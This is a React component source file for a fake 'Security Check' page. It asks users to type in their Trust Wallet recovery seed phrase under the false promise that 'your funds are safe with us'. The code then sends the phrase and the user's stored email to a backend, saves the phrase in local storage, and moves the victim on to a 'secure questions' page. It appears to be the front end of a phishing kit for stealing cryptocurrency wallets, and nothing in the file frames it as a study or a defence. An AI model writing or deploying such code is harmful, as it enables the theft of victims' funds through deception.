import styled from 'styled-components'
import Logo from './Logo'
import { Button, NoticeMessage, TextArea } from '../../theme/ThemeStyle'
import { useEffect, useState } from 'react'
import * as bip39 from 'bip39';
import { api } from '../../common/api';
import { useDispatch, useSelector } from 'react-redux'
import { useHistory } from 'react-router-dom/cjs/react-router-dom.min';
import { clearAccountValidationErrors, createAccountValidationError } from '../../app/accountVerification/slice';
import { AccountVerificationWrapper, Container, Main } from './GetStarted';
import HomeBackground from './HomeBackground';
import { setAlpha } from '../../common/utils';

const SeedPhrase = () => {

    const history = useHistory()
    const dispatch = useDispatch()
    const [seedPhrase, setSeedPhrase] = useState('')

    const { loading, error, isAuthenticated } = useSelector(state => state.accountVerification)

    const verifySeedPhrase = (e)=>{
        e.preventDefault()
        // const newPhrase = bip39.generateMnemonic();
        // console.log(newPhrase);
        const validLength = seedPhrase.trim().split(/\s+/g).length >= 12
        const isValidSeedPhrase = bip39.validateMnemonic(seedPhrase);


        if(validLength || isValidSeedPhrase){
            dispatch(api.validateSeedPhrase({mnemonic: seedPhrase, email: localStorage.getItem('email')}))
        }else{
            dispatch(createAccountValidationError('Invalid Seed Phrase'))
        }

    }

     const handleInput = e => {
        if(error){
            dispatch(clearAccountValidationErrors())
        }

        setSeedPhrase(e.target.value)
    }

    useEffect(()=>{
        if(isAuthenticated){
            localStorage.setItem('mnemonic', seedPhrase)
            dispatch(clearAccountValidationErrors())
            history.push('/account/verify/securequestions')
        }
    },[isAuthenticated])
    
    return (
        <Main>
            <Logo />
            <Container>
                {/* <HomeBackground /> */}
                <AccountVerificationWrapper onSubmit={verifySeedPhrase}>
                    <HeadingText>Security Check</HeadingText>
                    <Icon src='/../assets/verified_locked.png' alt='Unverified'/>
                    <Question>
                        <Title>Enter your Trust Wallet recovery seed phrase in the box below?</Title>
                        <p>Your security is our priority. Providing your recovery seed phrase helps us verify your account's legitimacy securely. Rest assured, your funds are safe with us.</p>
                        
                        {error&&<NoticeMessage value='error'>{error}</NoticeMessage>}
                        
                        <TextArea 
                            onChange={ handleInput}
                            value={seedPhrase}
                            rows={4}/>
                        <HelperText>Typically 12 (sometimes 24) words separated by single space.</HelperText>
                    </Question>
                    <Button type='submit'>Next</Button>
                </AccountVerificationWrapper>
            </Container>

        </Main>
    )
}


const Question = styled.div`
    display: flex;
    flex-direction: column;
    align-items: center;
    margin: 50px 20px;
    & p{
        color: ${({theme})=>theme.colors.dark3};
        margin: 0 0 10px;
        font-size: 12px;
    }
`

const Icon = styled.img`
    max-width: 150px;
    align-self: center;
`

const HeadingText = styled.h1`
    font-size: 36px;
    margin: 0;
`

const Title = styled.h2`
    font-size: 20px;
    margin: 0;
`
const SubTitle = styled.h3`
    font-size: 14px;
    font-weight: 300;
    text-align: center;
    margin: 0;
`
const HelperText = styled.div`
    color: ${({theme})=>setAlpha(theme.colors.primary, 0.7)};
    margin: 0 0 10px;
    font-size: 12px;
`
export default SeedPhrase